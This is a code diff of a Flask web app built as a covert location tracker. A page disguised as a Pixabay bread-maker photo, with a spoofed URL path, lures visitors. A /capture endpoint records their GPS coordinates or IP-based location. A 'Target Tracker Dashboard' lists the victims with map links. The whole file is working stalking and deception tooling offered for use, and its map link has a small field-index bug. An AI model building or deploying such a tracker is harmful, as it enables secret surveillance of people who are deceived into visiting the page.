@@ -1,10 +1,46 @@
-# --- THE TRAP (Cloaked as Pixabay) ---
+from flask import Flask, request, render_template_string
+import sqlite3
+from datetime import datetime
+import urllib.request
+import json
+import os
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect("tracker.db")
+    c = conn.cursor()
+    c.execute("""CREATE TABLE IF NOT EXISTS logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        lat TEXT, lon TEXT, city TEXT, country TEXT, ip TEXT, time TEXT, method TEXT
+    )""")
+    conn.commit()
+    conn.close()
+
+def log_location(lat, lon, city, country, ip, method):
+    conn = sqlite3.connect("tracker.db")
+    c = conn.cursor()
+    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    c.execute("INSERT INTO logs (lat, lon, city, country, ip, time, method) VALUES (?, ?, ?, ?, ?, ?, ?)", 
+              (lat, lon, city, country, ip, time_now, method))
+    conn.commit()
+    conn.close()
+
+def get_logs():
+    conn = sqlite3.connect("tracker.db")
+    c = conn.cursor()
+    c.execute("SELECT * FROM logs ORDER BY id DESC")
+    rows = c.fetchall()
+    conn.close()
+    return rows
+
+# --- THE TRAP (Cloaked as Pixabay with 3-second redirect) ---
 TRAP_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bread Machine - Free photo on Pixabay</title>
+    <title>Home Appliances - Bread Maker</title>
     <script>
         // 1. Change the URL path to look like Pixabay
         window.history.pushState("", "", "/photos/bread-machine-household-appliances-6047/");
@@ -74,3 +110,88 @@ TRAP_HTML = """
 </body>
 </html>
 """
+
+# --- YOUR DASHBOARD ---
+DASHBOARD_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spy Dashboard</title>
+    <style>
+        body { background-color: #0a1628; color: #f5f5f0; font-family: sans-serif; padding: 20px; }
+        h1 { color: #d4a017; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #1e5a8a; padding: 12px; text-align: left; }
+        th { background-color: #1e5a8a; color: white; }
+        a { color: #d4a017; text-decoration: none; font-weight: bold; }
+        .gps { color: #4ade80; font-weight: bold; }
+        .ip { color: #fbbf24; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Target Tracker Dashboard</h1>
+    <table>
+        <tr>
+            <th>Time</th>
+            <th>Method</th>
+            <th>IP Address</th>
+            <th>Approx City</th>
+            <th>Map Link</th>
+        </tr>
+        {% for log in logs %}
+        <tr>
+            <td>{{ log[5] }}</td>
+            <td class="{{ 'gps' if log[6] == 'GPS' else 'ip' }}">{{ log[6] }}</td>
+            <td>{{ log[4] }}</td>
+            <td>{{ log[2] }}, {{ log[3] }}</td>
+            <td><a href="https://www.google.com/maps?q={{ log[1] }},{{ log[2] }}" target="_blank">Open Map 📍</a></td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
+"""
+
+@app.route('/')
+def dashboard():
+    return render_template_string(DASHBOARD_HTML, logs=get_logs())
+
+@app.route('/trap')
+def trap():
+    return render_template_string(TRAP_HTML)
+
+@app.route('/capture')
+def capture():
+    lat = request.args.get('lat')
+    lon = request.args.get('lon')
+    method = request.args.get('method')
+    
+    if request.headers.getlist("X-Forwarded-For"):
+       ip = request.headers.getlist("X-Forwarded-For")[0]
+    else:
+       ip = request.remote_addr
+
+    city, country = "Unknown", "Unknown"
+       
+    if method == "IP" or not lat:
+        try:
+            req = urllib.request.urlopen(f'http://ip-api.com/json/{ip}').read()
+            data = json.loads(req)
+            if data['status'] == 'success':
+                lat = data['lat']
+                lon = data['lon']
+                city = data['city']
+                country = data['country']
+        except Exception:
+            pass
+
+    if lat and lon:
+        log_location(lat, lon, city, country, ip, method)
+        return "Logged", 200
+    return "Failed", 400
+
+if __name__ == '__main__':
+    init_db()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
